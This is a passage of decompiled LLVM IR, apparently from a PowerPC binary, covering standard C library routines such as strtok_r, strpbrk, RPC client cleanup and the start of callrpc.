  %v0_10021edc = phi i32 [ %v0_10021edc.pre, %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge ], [ -2130640640, %dec_label_pc_10021e98 ]
  %v0_10021ec8 = phi i32 [ %v0_10021ec8.pre, %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge ], [ %v2_10021eb4, %dec_label_pc_10021e98 ]
  %v0_10021ec4 = phi i32 [ %v0_10021ec4.pre, %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge ], [ %v0_10021e98, %dec_label_pc_10021e98 ]
  %v0_10021ec0 = phi i32 [ %v0_10021ec0.pre, %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge ], [ %v0_10021ec016, %dec_label_pc_10021e98 ]
  %v1_10021ec0 = add i32 %v0_10021ec0, -4
  %v2_10021ec0 = inttoptr i32 %v1_10021ec0 to i32*
  %v3_10021ec0 = load i32, i32* %v2_10021ec0, align 4
  store i32 %v1_10021ec0, i32* %r3.global-to-local, align 4
  %v1_10021ec4 = add i32 %v0_10021ec4, -4
  store i32 %v1_10021ec4, i32* %r5.global-to-local, align 4
  %v2_10021ec8 = xor i32 %v3_10021ec0, %v0_10021ec8
  %v1_10021ed0 = add i32 %v2_10021ec8, 2130640639
  %v2_10021ed4 = xor i32 %v1_10021ed0, %v2_10021ec8
  %v1_10021ed8 = add i32 %v0_10021ec0, -1
  store i32 %v1_10021ed8, i32* @r11, align 4
  %v2_10021edc = sub i32 -1, %v2_10021ed4
  %v3_10021edc = and i32 %v0_10021edc, %v2_10021edc
  %v6_10021edc = icmp eq i32 %v3_10021edc, 0
  br i1 %v6_10021edc, label %dec_label_pc_10021f34.backedge, label %dec_label_pc_10021ee4

dec_label_pc_10021ee4:                            ; preds = %dec_label_pc_10021ec0
  %v2_10021ee4 = inttoptr i32 %v1_10021ed8 to i8*
  %v3_10021ee4 = load i8, i8* %v2_10021ee4, align 1
  %v4_10021ee4 = zext i8 %v3_10021ee4 to i32
  %v1_10021ee8 = add i32 %v0_10021ec0, -2
  %v1_10021eec = add i32 %v0_10021ec0, -3
  store i32 %v1_10021eec, i32* @r10, align 4
  %v1_10021ef0 = load i32, i32* %r4.global-to-local, align 4
  %v4_10021ef0 = icmp eq i32 %v4_10021ee4, %v1_10021ef0
  br i1 %v4_10021ef0, label %dec_label_pc_10021ef8, label %dec_label_pc_10021f00

dec_label_pc_10021ef8:                            ; preds = %dec_label_pc_10021ee4
  store i32 %v1_10021ed8, i32* %r3.global-to-local, align 4
  ret i32 %v1_10021ed8

dec_label_pc_10021f00:                            ; preds = %dec_label_pc_10021ee4
  %v2_10021f00 = inttoptr i32 %v1_10021ee8 to i8*
  %v3_10021f00 = load i8, i8* %v2_10021f00, align 1
  %v4_10021f00 = zext i8 %v3_10021f00 to i32
  %v4_10021f04 = icmp eq i32 %v4_10021f00, %v1_10021ef0
  br i1 %v4_10021f04, label %dec_label_pc_10021f0c, label %dec_label_pc_10021f14

dec_label_pc_10021f0c:                            ; preds = %dec_label_pc_10021f00
  store i32 %v1_10021ee8, i32* %r3.global-to-local, align 4
  ret i32 %v1_10021ee8

dec_label_pc_10021f14:                            ; preds = %dec_label_pc_10021f00
  %v2_10021f14 = inttoptr i32 %v1_10021eec to i8*
  %v3_10021f14 = load i8, i8* %v2_10021f14, align 1
  %v4_10021f14 = zext i8 %v3_10021f14 to i32
  %v4_10021f18 = icmp eq i32 %v4_10021f14, %v1_10021ef0
  br i1 %v4_10021f18, label %dec_label_pc_10021f20, label %dec_label_pc_10021f28

dec_label_pc_10021f20:                            ; preds = %dec_label_pc_10021f14
  store i32 %v1_10021eec, i32* %r3.global-to-local, align 4
  ret i32 %v1_10021eec

dec_label_pc_10021f28:                            ; preds = %dec_label_pc_10021f14
  %v1_10021f28 = inttoptr i32 %v1_10021ec0 to i8*
  %v2_10021f28 = load i8, i8* %v1_10021f28, align 1
  %v3_10021f28 = zext i8 %v2_10021f28 to i32
  %v4_10021f2c = icmp eq i32 %v3_10021f28, %v1_10021ef0
  %v0_10021f30 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021f2c, i32 %v0_10021f30)
  %v0_10021f34.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10021f34.backedge

dec_label_pc_10021f34.backedge:                   ; preds = %dec_label_pc_10021f28, %dec_label_pc_10021ec0
  %v0_10021f34 = phi i32 [ %v0_10021f34.pre, %dec_label_pc_10021f28 ], [ %v0_10021f3421, %dec_label_pc_10021ec0 ]
  %v1_10021f34 = add i32 %v0_10021f34, -1
  store i32 %v1_10021f34, i32* %ctr.global-to-local, align 4
  %v2_10021f34 = icmp eq i32 %v1_10021f34, 0
  br i1 %v2_10021f34, label %dec_label_pc_10021f34.dec_label_pc_10021f38_crit_edge, label %dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge

dec_label_pc_10021f34.backedge.dec_label_pc_10021ec0_crit_edge: ; preds = %dec_label_pc_10021f34.backedge
  %v0_10021ec0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10021ec4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10021ec8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10021edc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10021ec0

dec_label_pc_10021f34.dec_label_pc_10021f38_crit_edge: ; preds = %dec_label_pc_10021f34.backedge
  %v0_10021f38.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021f38

dec_label_pc_10021f38:                            ; preds = %dec_label_pc_10021f34.dec_label_pc_10021f38_crit_edge, %dec_label_pc_10021e98
  %v0_10021f38 = phi i32 [ %v0_10021f38.pre, %dec_label_pc_10021f34.dec_label_pc_10021f38_crit_edge ], [ %v0_10021e98, %dec_label_pc_10021e98 ]
  %v1_10021f38 = add i32 %v0_10021f38, 1
  store i32 %v1_10021f38, i32* %r5.global-to-local, align 4
  store i32 %v0_10021f38, i32* %ctr.global-to-local, align 4
  %v2_10021f503 = icmp eq i32 %v0_10021f38, 0
  br i1 %v2_10021f503, label %dec_label_pc_10021f54, label %dec_label_pc_10021f44

dec_label_pc_10021f44:                            ; preds = %dec_label_pc_10021f38, %dec_label_pc_10021f44
  %v0_10021f44 = load i32, i32* %r3.global-to-local, align 4
  %v1_10021f44 = add i32 %v0_10021f44, -1
  %v2_10021f44 = inttoptr i32 %v1_10021f44 to i8*
  %v3_10021f44 = load i8, i8* %v2_10021f44, align 1
  %v4_10021f44 = zext i8 %v3_10021f44 to i32
  store i32 %v1_10021f44, i32* %r3.global-to-local, align 4
  %v1_10021f48 = load i32, i32* %r4.global-to-local, align 4
  %v4_10021f48 = icmp eq i32 %v4_10021f44, %v1_10021f48
  %v0_10021f4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021f48, i32 %v0_10021f4c)
  %v0_10021f50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021f50 = add i32 %v0_10021f50, -1
  store i32 %v1_10021f50, i32* %ctr.global-to-local, align 4
  %v2_10021f50 = icmp eq i32 %v1_10021f50, 0
  br i1 %v2_10021f50, label %dec_label_pc_10021f54, label %dec_label_pc_10021f44

dec_label_pc_10021f54:                            ; preds = %dec_label_pc_10021f44, %dec_label_pc_10021f38
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10021f50, { 1, 0 }
  uselistorder i32 %v0_10021f38, { 1, 2, 0 }
  uselistorder i32 %v1_10021f34, { 2, 1, 0 }
  uselistorder i32 %v1_10021eec, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10021ee8, { 1, 0, 2 }
  uselistorder i32 %v1_10021ed8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10021ea4, { 1, 0 }
  uselistorder i32 %v1_10021e98, { 2, 1, 0 }
  uselistorder i32 %v0_10021e98, { 3, 2, 0, 1 }
  uselistorder i32 %v0_10021e9c, { 1, 0 }
  uselistorder i32 %v1_10021e90, { 1, 0 }
  uselistorder i32 %v0_10021e8c, { 1, 0, 2 }
  uselistorder i32 %v2_10021e74, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10021e6c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 6, 5, 1, 8, 7, 2 }
  uselistorder i32 -3, { 1, 3, 4, 0, 5, 2, 6 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10021f44, { 1, 0 }
  uselistorder label %dec_label_pc_10021ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10021e94, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10021f68 = icmp eq i32 %arg1, 0
  %v0_10021f70 = load i32, i32* @r5, align 4
  store i32 %v0_10021f70, i32* %r30.global-to-local, align 4
  %v0_10021f74 = load i32, i32* @r4, align 4
  store i32 %v0_10021f74, i32* %r29.global-to-local, align 4
  br i1 %v3_10021f68, label %dec_label_pc_10021f7c, label %dec_label_pc_10021f80

dec_label_pc_10021f7c:                            ; preds = %entry
  %v1_10021f7c = inttoptr i32 %v0_10021f70 to i32*
  %v2_10021f7c = load i32, i32* %v1_10021f7c, align 4
  store i32 %v2_10021f7c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10021f80

dec_label_pc_10021f80:                            ; preds = %entry, %dec_label_pc_10021f7c
  %v0_10021f80 = phi i32 [ %arg1, %entry ], [ %v2_10021f7c, %dec_label_pc_10021f7c ]
  store i32 %v0_10021f80, i32* @r3, align 4
  %v1_10021f84 = inttoptr i32 %v0_10021f80 to i8*
  %v2_10021f84 = call i32 @__GI_strspn(i8* %v1_10021f84)
  %v0_10021f88 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10021f88, i32* @r4, align 4
  %v0_10021f8c = load i32, i32* %r31.global-to-local, align 4
  %v2_10021f8c = add i32 %v0_10021f8c, %v2_10021f84
  %v3_10021f8c = inttoptr i32 %v2_10021f8c to i8*
  %v4_10021f8c = load i8, i8* %v3_10021f8c, align 1
  store i32 %v2_10021f8c, i32* @r31, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %v2_10021f8c, i32* @r3, align 4
  %v3_10021f9c = icmp eq i8 %v4_10021f8c, 0
  br i1 %v3_10021f9c, label %dec_label_pc_10021fa4, label %dec_label_pc_10021fac

dec_label_pc_10021fa4:                            ; preds = %dec_label_pc_10021f80
  %v1_10021fa4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10021fa4 = inttoptr i32 %v1_10021fa4 to i32*
  store i32 %v2_10021f8c, i32* %v2_10021fa4, align 4
  br label %dec_label_pc_10021fe4

dec_label_pc_10021fac:                            ; preds = %dec_label_pc_10021f80
  store i32 268574640, i32* @lr, align 4
  %v0_10021fac = call i32 @__GI_strpbrk()
  store i32 %v0_10021fac, i32* %r9.global-to-local, align 4
  %v4_10021fb4 = icmp eq i32 %v0_10021fac, 0
  %v0_10021fb8 = load i32, i32* @r31, align 4
  store i32 %v0_10021fb8, i32* @r3, align 4
  %v2_10021fbc = add i32 %v0_10021fac, 1
  store i32 %v2_10021fbc, i32* @r11, align 4
  br i1 %v4_10021fb4, label %dec_label_pc_10021fc4, label %dec_label_pc_10021fd4

dec_label_pc_10021fc4:                            ; preds = %dec_label_pc_10021fac
  store i32 268574664, i32* @lr, align 4
  %v4_10021fc4 = call i32 @rawmemchr(i32 %v0_10021fb8, i32 0, i32 0)
  %v0_10021fc8 = load i32, i32* @r31, align 4
  store i32 %v0_10021fc8, i32* %r9.global-to-local, align 4
  %v1_10021fcc = load i32, i32* %r30.global-to-local, align 4
  %v2_10021fcc = inttoptr i32 %v1_10021fcc to i32*
  store i32 %v4_10021fc4, i32* %v2_10021fcc, align 4
  br label %dec_label_pc_10021fe4

dec_label_pc_10021fd4:                            ; preds = %dec_label_pc_10021fac
  %v1_10021fb4 = inttoptr i32 %v0_10021fac to i8*
  store i8 0, i8* %v1_10021fb4, align 1
  %v0_10021fdc = load i32, i32* @r31, align 4
  store i32 %v0_10021fdc, i32* %r9.global-to-local, align 4
  %v0_10021fe0 = load i32, i32* @r11, align 4
  %v1_10021fe0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10021fe0 = inttoptr i32 %v1_10021fe0 to i32*
  store i32 %v0_10021fe0, i32* %v2_10021fe0, align 4
  br label %dec_label_pc_10021fe4

dec_label_pc_10021fe4:                            ; preds = %dec_label_pc_10021fc4, %dec_label_pc_10021fa4, %dec_label_pc_10021fd4
  %v0_10021fe8 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10021fe8

; uselistorder directives
  uselistorder i32 %v0_10021fac, { 3, 0, 1, 2 }
  uselistorder i32 %v2_10021f8c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10021f80, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10021fe4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021f80, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1002201c1 = load i32, i32* @r3, align 4
  %v1_1002201c2 = inttoptr i32 %v0_1002201c1 to i8*
  %v2_1002201c3 = load i8, i8* %v1_1002201c2, align 1
  %v3_1002201c4 = zext i8 %v2_1002201c3 to i32
  store i32 %v3_1002201c4, i32* %r11.global-to-local, align 4
  %v3_100220206 = icmp eq i8 %v2_1002201c3, 0
  br i1 %v3_100220206, label %dec_label_pc_10022030, label %dec_label_pc_10022028

dec_label_pc_10022000:                            ; preds = %dec_label_pc_10022004
  %v3_10022004 = zext i8 %v2_10022004 to i32
  %v4_10022010 = icmp eq i32 %v3_10022004, %v1_10022010
  %v0_10022000 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10022010, i32 %v0_10022000)
  %v0_10022004.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10022010.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10022004

dec_label_pc_10022004:                            ; preds = %dec_label_pc_10022028, %dec_label_pc_10022000
  %v1_10022010 = phi i32 [ %v1_100220109, %dec_label_pc_10022028 ], [ %v1_10022010.pre, %dec_label_pc_10022000 ]
  %v0_10022004 = phi i32 [ %v0_10022028, %dec_label_pc_10022028 ], [ %v0_10022004.pre, %dec_label_pc_10022000 ]
  %v1_10022004 = inttoptr i32 %v0_10022004 to i8*
  %v2_10022004 = load i8, i8* %v1_10022004, align 1
  %v1_10022008 = add i32 %v0_10022004, 1
  store i32 %v1_10022008, i32* %r9.global-to-local, align 4
  %v3_1002200c = icmp eq i8 %v2_10022004, 0
  br i1 %v3_1002200c, label %dec_label_pc_10022018, label %dec_label_pc_10022000

dec_label_pc_10022018:                            ; preds = %dec_label_pc_10022004
  %v0_10022018 = load i32, i32* @r3, align 4
  %v1_10022018 = add i32 %v0_10022018, 1
  store i32 %v1_10022018, i32* @r3, align 4
  %v1_1002201c = inttoptr i32 %v1_10022018 to i8*
  %v2_1002201c = load i8, i8* %v1_1002201c, align 1
  %v3_1002201c = zext i8 %v2_1002201c to i32
  store i32 %v3_1002201c, i32* %r11.global-to-local, align 4
  %v3_10022020 = icmp eq i8 %v2_1002201c, 0
  br i1 %v3_10022020, label %dec_label_pc_10022030, label %dec_label_pc_10022028

dec_label_pc_10022028:                            ; preds = %entry, %dec_label_pc_10022018
  %v1_100220109 = phi i32 [ %v3_1002201c, %dec_label_pc_10022018 ], [ %v3_1002201c4, %entry ]
  %v0_10022028 = load i32, i32* @r4, align 4
  store i32 %v0_10022028, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10022004

dec_label_pc_10022030:                            ; preds = %dec_label_pc_10022018, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10022028, { 1, 0 }
  uselistorder i32 %v0_10022004, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10022028, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 268574796, i32* @lr, align 4
  %v0_10022048 = call i32 @__rpc_thread_variables()
  %v1_1002204c = add i32 %v0_10022048, 164
  %v2_1002204c = inttoptr i32 %v1_1002204c to i32*
  %v3_1002204c = load i32, i32* %v2_1002204c, align 4
  store i32 %v3_1002204c, i32* %r31.global-to-local, align 4
  %v3_10022050 = icmp eq i32 %v3_1002204c, 0
  br i1 %v3_10022050, label %dec_label_pc_10022080, label %dec_label_pc_10022058

dec_label_pc_10022058:                            ; preds = %entry
  %v1_10022058 = inttoptr i32 %v3_1002204c to i32*
  %v2_10022058 = load i32, i32* %v1_10022058, align 4
  %v3_1002205c = icmp eq i32 %v2_10022058, 0
  br i1 %v3_1002205c, label %dec_label_pc_10022078, label %dec_label_pc_10022068

dec_label_pc_10022068:                            ; preds = %dec_label_pc_10022058
  %v1_10022068 = add i32 %v2_10022058, 4
  %v2_10022068 = inttoptr i32 %v1_10022068 to i32*
  %v3_10022068 = load i32, i32* %v2_10022068, align 4
  %v1_1002206c = add i32 %v3_10022068, 16
  %v2_1002206c = inttoptr i32 %v1_1002206c to i32*
  %v3_1002206c = load i32, i32* %v2_1002206c, align 4
  call void @__pseudo_call(i32 %v3_1002206c)
  %v0_10022078.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10022078

dec_label_pc_10022078:                            ; preds = %dec_label_pc_10022058, %dec_label_pc_10022068
  %v0_10022078 = phi i32 [ %v3_1002204c, %dec_label_pc_10022058 ], [ %v0_10022078.pre, %dec_label_pc_10022068 ]
  store i32 %v0_10022078, i32* @r3, align 4
  store i32 268574848, i32* @lr, align 4
  %v0_1002207c = call i32 @free()
  br label %dec_label_pc_10022080

dec_label_pc_10022080:                            ; preds = %entry, %dec_label_pc_10022078
  %v0_10022090 = phi i32 [ %v0_10022048, %entry ], [ %v0_1002207c, %dec_label_pc_10022078 ]
  ret i32 %v0_10022090

; uselistorder directives
  uselistorder label %dec_label_pc_10022080, { 1, 0 }
  uselistorder label %dec_label_pc_10022078, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1145 = alloca i32, align 4
  %stack_var_-1168 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10022094 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10022094, i32* %stack_var_-128, align 4
  %v0_10022098 = load i32, i32* @lr, align 4
  store i32 %v0_10022098, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r21, align 4
  store i32 %arg2, i32* %r23.global-to-local, align 4
  store i32 %arg3, i32* @r22, align 4
  store i32 %arg4, i32* @r20, align 4
  store i32 %arg5, i32* @r19, align 4
  store i32 %arg6, i32* @r18, align 4
  store i32 %arg7, i32* @r17, align 4
  %v0_100220c4 = load i32, i32* @r10, align 4
  store i32 %v0_100220c4, i32* @r16, align 4
  store i32 268574924, i32* @lr, align 4
  %v0_100220c8 = call i32 @__rpc_thread_variables()
  store i32 %v0_100220c8, i32* %r3.global-to-local, align 4
  %v1_100220cc = add i32 %v0_100220c8, 164
  %v2_100220cc = inttoptr i32 %v1_100220cc to i32*
  %v3_100220cc = load i32, i32* %v2_100220cc, align 4
  store i32 %v3_100220cc, i32* @r30, align 4
  store i32 %v0_100220c8, i32* @r29, align 4
  %v3_100220d4 = icmp eq i32 %v3_100220cc, 0
  br i1 %v3_100220d4, label %dec_label_pc_100220dc, label %dec_label_pc_100220f8

dec_label_pc_100220dc:                            ; preds = %entry
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268574952, i32* @lr, align 4
  %v2_100220e4 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_100220e4, i32* @r30, align 4
  %v3_100220e8 = icmp eq i32 %v2_100220e4, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100220e8, label %dec_label_pc_100222f0, label %dec_label_pc_100220f4

dec_label_pc_100220f4:                            ; preds = %dec_label_pc_100220dc
  %v1_100220f4 = load i32, i32* @r29, align 4
  %v2_100220f4 = add i32 %v1_100220f4, 164
  %v3_100220f4 = inttoptr i32 %v2_100220f4 to i32*
  store i32 %v2_100220e4, i32* %v3_100220f4, align 4
  %v0_100220f8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100220f8

dec_label_pc_100220f8:                            ; preds = %entry, %dec_label_pc_100220f4
  %v0_100220f8 = phi i32 [ %v3_100220cc, %entry ], [ %v0_100220f8.pre, %dec_label_pc_100220f4 ]
  %v1_100220f8 = add i32 %v0_100220f8, 20
  %v2_100220f8 = inttoptr i32 %v1_100220f8 to i32*
  %v3_100220f8 = load i32, i32* %v2_100220f8, align 4
  store i32 %v3_100220f8, i32* @r29, align 4
  %v3_100220fc = icmp eq i32 %v3_100220f8, 0
  br i1 %v3_100220fc, label %dec_label_pc_10022104, label %dec_label_pc_1002211c

dec_label_pc_10022104:                            ; preds = %dec_label_pc_100220f8
  store i32 256, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002210c.1291 to i32), i32* @lr, align 4
  %v0_10022108 = call i32 @malloc()
  %v1_10022108 = inttoptr i32 %v0_10022108 to i8*
  store i32 %v0_10022108, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10022110 = load i32, i32* @r30, align 4
  %v3_10022110 = add i32 %v2_10022110, 20
  %v4_10022110 = inttoptr i32 %v3_10022110 to i32*
  store i32 %v0_10022108, i32* %v4_10022110, align 4
  %v0_10022114 = load i32, i32* @r29, align 4
  %v1_10022114 = trunc i32 %v0_10022114 to i8
  store i8 %v1_10022114, i8* %v1_10022108, align 1
  %v0_10022118 = load i32, i32* %r0.global-to-local, align 4
  %v1_10022118 = load i32, i32* @r30, align 4
  %v2_10022118 = add i32 %v1_10022118, 4
  %v3_10022118 = inttoptr i32 %v2_10022118 to i32*
  store i32 %v0_10022118, i32* %v3_10022118, align 4
  %v0_1002211c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1002211c

dec_label_pc_1002211c:                            ; preds = %dec_label_pc_100220f8, %dec_label_pc_10022104
  %v0_10022140 = phi i32 [ %v0_100220f8, %dec_label_pc_100220f8 ], [ %v0_1002211c.pre, %dec_label_pc_10022104 ]
  %v1_1002211c = add i32 %v0_10022140, 16
  %v2_1002211c = inttoptr i32 %v1_1002211c to i32*
  %v3_1002211c = load i32, i32* %v2_1002211c, align 4
  store i32 %v3_1002211c, i32* %r0.global-to-local, align 4
  %v3_10022120 = icmp eq i32 %v3_1002211c, 0
  br i1 %v3_10022120, label %dec_label_pc_10022154, label %dec_label_pc_10022128

dec_label_pc_10022128:                            ; preds = %dec_label_pc_1002211c
  %v1_10022128 = add i32 %v0_10022140, 8
  %v2_10022128 = inttoptr i32 %v1_10022128 to i32*
  %v3_10022128 = load i32, i32* %v2_10022128, align 4
  store i32 %v3_10022128, i32* %r0.global-to-local, align 4
  %v1_1002212c = load i32, i32* %r23.global-to-local, align 4
  %v4_1002212c = icmp eq i32 %v3_10022128, %v1_1002212c
  br i1 %v4_1002212c, label %dec_label_pc_10022134, label %dec_label_pc_10022154

dec_label_pc_10022134:                            ; preds = %dec_label_pc_10022128
  %v1_10022134 = add i32 %v0_10022140, 12
  %v2_10022134 = inttoptr i32 %v1_10022134 to i32*
  %v3_10022134 = load i32, i32* %v2_10022134, align 4
  store i32 %v3_10022134, i32* %r0.global-to-local, align 4
  %v1_10022138 = load i32, i32* @r22, align 4
  %v4_10022138 = icmp eq i32 %v3_10022134, %v1_10022138
  br i1 %v4_10022138, label %dec_label_pc_10022140, label %dec_label_pc_10022154

dec_label_pc_10022140:                            ; preds = %dec_label_pc_10022134
  %v1_10022140 = add i32 %v0_10022140, 20
  %v2_10022140 = inttoptr i32 %v1_10022140 to i32*
  %v3_10022140 = load i32, i32* %v2_10022140, align 4
  store i32 %v3_10022140, i32* %r3.global-to-local, align 4
  %v0_10022144 = load i32, i32* @r21, align 4
  store i32 %v0_10022144, i32* @r4, align 4
  %v2_10022148 = inttoptr i32 %v3_10022140 to i8*
  %v3_10022148 = call i32 @__GI_strcoll(i8* %v2_10022148, i32 %v0_10022144)
  store i32 %v3_10022148, i32* %r3.global-to-local, align 4
  %v3_1002214c = icmp eq i32 %v3_10022148, 0
  br i1 %v3_1002214c, label %dec_label_pc_10022140.dec_label_pc_10022298_crit_edge, label %dec_label_pc_10022140.dec_label_pc_10022154_crit_edge

dec_label_pc_10022140.dec_label_pc_10022298_crit_edge: ; preds = %dec_label_pc_10022140
  br label %dec_label_pc_10022298

dec_label_pc_10022140.dec_label_pc_10022154_crit_edge: ; preds = %dec_label_pc_10022140
  %v0_10022154.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10022154

dec_label_pc_10022154:                            ; preds = %dec_label_pc_10022140.dec_label_pc_10022154_crit_edge, %dec_label_pc_10022134, %dec_label_pc_10022128, %dec_label_pc_1002211c
  %v0_10022154 = phi i32 [ %v0_10022154.pre, %dec_label_pc_10022140.dec_label_pc_10022154_crit_edge ], [ %v0_10022140, %dec_label_pc_10022134 ], [ %v0_10022140, %dec_label_pc_10022128 ], [ %v0_10022140, %dec_label_pc_1002211c ]
  %v1_10022154 = add i32 %v0_10022154, 4
  %v2_10022154 = inttoptr i32 %v1_10022154 to i32*
  %v3_10022154 = load i32, i32* %v2_10022154, align 4
  store i32 %v3_10022154, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_1002215c = add i32 %v0_10022154, 16
  %v3_1002215c = inttoptr i32 %v2_1002215c to i32*
  store i32 0, i32* %v3_1002215c, align 4
  %v3_10022160 = icmp eq i32 %v3_10022154, -1
  br i1 %v3_10022160, label %dec_label_pc_10022174, label %dec_label_pc_10022168

dec_label_pc_10022168:                            ; preds = %dec_label_pc_10022154
  store i32 ptrtoint (i32* @global_var_1002216c.1292 to i32), i32* @lr, align 4
  %v1_10022168 = call i32 @__libc_close(i32 %v3_10022154)
  store i32 %v1_10022168, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10022170 = load i32, i32* @r30, align 4
  %v2_10022170 = add i32 %v1_10022170, 4
  %v3_10022170 = inttoptr i32 %v2_10022170 to i32*
  store i32 -1, i32* %v3_10022170, align 4
  br label %dec_label_pc_10022174

dec_label_pc_10022174:                            ; preds = %dec_label_pc_10022154, %dec_label_pc_10022168
  %v0_10022174 = load i32, i32* @r30, align 4
  %v1_10022174 = inttoptr i32 %v0_10022174 to i32*
  %v2_10022174 = load i32, i32* %v1_10022174, align 4
  store i32 %v2_10022174, i32* %r3.global-to-local, align 4
  %v3_10022178 = icmp eq i32 %v2_10022174, 0
  br i1 %v3_10022178, label %dec_label_pc_10022194, label %dec_label_pc_10022180

dec_label_pc_10022180:                            ; preds = %dec_label_pc_10022174
  %v1_10022180 = add i32 %v2_10022174, 4
  %v2_10022180 = inttoptr i32 %v1_10022180 to i32*
  %v3_10022180 = load i32, i32* %v2_10022180, align 4
  %v1_10022184 = add i32 %v3_10022180, 16
  %v2_10022184 = inttoptr i32 %v1_10022184 to i32*
  %v3_10022184 = load i32, i32* %v2_10022184, align 4
  call void @__pseudo_call(i32 %v3_10022184)
  %v0_10022190 = load i32, i32* %r29.global-to-local, align 4
  %v1_10022190 = load i32, i32* @r30, align 4
  %v2_10022190 = inttoptr i32 %v1_10022190 to i32*
  store i32 %v0_10022190, i32* %v2_10022190, align 4
  br label %dec_label_pc_10022194

dec_label_pc_10022194:                            ; preds = %dec_label_pc_10022174, %dec_label_pc_10022180
  %v2_10022194 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_10022194, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r29, align 4
  store i32 %v2_10022194, i32* %stack_var_-1168, align 4
  %v2_100221d4 = ptrtoint i32* %stack_var_-1145 to i32
  %v2_100221e4 = ptrtoint i32* %stack_var_-120 to i32
  %v2_100221e8 = ptrtoint i32* %stack_var_-116 to i32
  br label %dec_label_pc_100221d4

dec_label_pc_100221a4:                            ; preds = %dec_label_pc_100221d4, %dec_label_pc_10022200
